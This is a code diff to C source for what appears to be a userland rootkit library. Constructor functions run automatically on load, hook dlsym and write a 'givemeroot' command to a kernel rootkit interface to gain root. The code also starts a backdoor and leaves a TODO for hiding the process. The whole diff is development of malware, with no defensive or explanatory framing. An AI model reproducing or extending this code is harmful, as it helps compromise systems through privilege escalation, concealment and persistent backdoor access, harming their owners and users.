@@ -1,5 +1,6 @@
 #define _GNU_SOURCE
 
+#include <stdarg.h>
 #include <stdint.h>
 #include <signal.h>
 #include <pthread.h>
@@ -18,22 +19,46 @@
 extern char **environ;
 extern void *(*real_dlsym)(void *handle, const char *name);
 
+static int proc_uid, proc_gid;
+
+pid_t proc_id;
 void *libc;
 
-static int rk_exec(const char *file, const char *cmd)
+static int rk_exec(const char *file, const char *cmdfmt, ...)
 {
     int fd;
+
+    char cmdbuf[128] = "";
+    va_list args;
+
+    va_start(args, cmdfmt);
+    vsprintf(cmdbuf, cmdfmt, args);
+    va_end(args);
 
     if((fd = open(file, O_WRONLY)) < 0)
         return -1;
 
-    write(fd, cmd, strlen(cmd));
+#ifdef DEBUG
+    printf("Executing: %s\r\n", cmdbuf);
+#endif
+
+    write(fd, cmdbuf, strlen(cmdbuf));
+
+    close(fd);
 
     return 0;
 }
 
 int main(void)
 {
+    int i;
+    for(i = 0; i < 60; i++)
+    {
+#ifdef DEBUG
+        printf("Sleeping for 1 second!\r\n");
+#endif
+        sleep(1);
+    }
 
     return 0;
 }
@@ -101,10 +126,35 @@ __attribute__((constructor (101))) void anti_tricks(void)
 
 __attribute__((constructor (102))) void pre_core(void)
 {
+    proc_id = getpid();
+    proc_uid = getuid();
+    proc_gid = getgid();
+
     libc = dlopen(LIBC_PATH, RTLD_LAZY);
 
     if(!real_dlsym)
         find_dlsym();
+}
+
+__attribute__((constructor (103))) int post_core(void)
+{
+#ifdef DEBUG
+    printf("Normal Operation!\r\n");
+#endif
+
+    if(proc_uid != 0)
+    {
+#ifdef DEBUG
+        printf("We're not root, using rootkit to gain root...\r\n");
+#endif
+        rk_exec(RK_PATH, "givemeroot");
+    }
+    else
+    {
+#ifdef DEBUG
+        printf("We're already root, skip rootkit to gain root...\r\n");
+#endif
+    }
 
     if(init_bkdoor() < 0)
     {
@@ -112,60 +162,12 @@ __attribute__((constructor (102))) void pre_core(void)
         printf("Failed initiating backdoor!\r\n");
 #endif
     }
-}
 
-__attribute__((constructor (103))) int post_core(void)
-{
-    int uid, orig_uid, orig_gid;
+    //TODO: Build better dhproc in rootkit
+    //rk_exec(RK_PATH, "dhproc%d", proc_id);
 
-#ifdef DEBUG
-    printf("Normal Operation!\r\n");
-#endif
-
-    if(fork() == 0) // Child
-    {
-        orig_uid = getuid();
-        orig_gid = getgid();
-
-        if(orig_uid == 0)
-        {
-#ifdef DEBUG
-            printf("We're already root, skip using rootkit...\r\n");
-#endif
-            return -1;
-        }
-
-        rk_exec(RK_PATH, "givemeroot");
-
-
-    }
-
-    /*
-    orig_uid = getuid();
-    orig_gid = getgid();
-
-    if(orig_uid > 0)
-        printf("Not Root!\r\n");
-
-    rk_exec("/proc/rk", "givemeroot");
-
-    uid = getuid();
-
-    if(uid == 0) // TODO: Root priveledged stuff
-        printf("Are Root!\r\n");
-    else if(uid == orig_uid)
-        printf("Still Not Root!\r\n");
-
-    setuid(orig_uid);
-    setgid(orig_gid);
-
-    uid = getuid();
-
-    if(uid != orig_uid || uid == 0)
-        printf("Still Root, uid: %d\r\n", uid);
-    else if(uid == orig_uid)
-        printf("We're not root anymore, uid: %d\r\n", uid);
-    */
+    setuid(proc_uid);
+    setgid(proc_gid);
 
     return 0;
 }
